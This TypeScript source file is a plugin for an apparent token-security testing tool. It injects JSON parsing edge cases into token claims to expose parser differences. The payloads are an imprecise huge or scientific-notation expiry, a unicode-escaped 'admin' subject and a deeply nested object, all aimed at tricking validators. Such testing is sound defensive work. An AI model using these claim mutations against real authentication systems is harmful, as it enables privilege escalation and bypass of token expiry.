import type { MischiefPlugin } from "../types.js";

export const jsonParsingDifferentials: MischiefPlugin = {
	id: "json-parsing-differentials",
	name: "JSON Parsing Differentials",
	severity: "medium",
	phase: "token-claims",
	spec: {
		description: "Exploits JSON parsing differences between implementations",
		rfc: "RFC 8259",
		cwe: "CWE-436",
	},
	description: "Injects JSON edge cases that parse differently across libraries",

	async apply(ctx) {
		if (!ctx.token) {
			return { applied: false, mutation: "No token context", evidence: {} };
		}

		const token = ctx.token;
		const parsingTricks = [
			{
				name: "large-number",
				apply: () => {
					// Intentionally use a number that loses precision in JS
					token.claims.exp = Number("9999999999999999999");
				},
			},
			{
				name: "scientific-notation",
				apply: () => {
					token.claims.exp = 1e20 as unknown as number;
				},
			},
			{
				name: "unicode-escapes",
				apply: () => {
					token.claims.sub = "\\u0061dmin";
				},
			},
			{
				name: "nested-depth",
				apply: () => {
					let obj: Record<string, unknown> = { value: "admin" };
					for (let i = 0; i < 100; i++) {
						obj = { nested: obj };
					}
					token.claims.deep_nested = obj;
				},
			},
		];

		const selectedTrick =
			parsingTricks[Math.floor(Math.random() * parsingTricks.length)] ?? parsingTricks[0];
		selectedTrick.apply();

		return {
			applied: true,
			mutation: `Applied JSON parsing trick: ${selectedTrick.name}`,
			evidence: {
				trickType: selectedTrick.name,
				vulnerability: "Different JSON parsers may interpret the same input differently",
			},
		};
	},
};
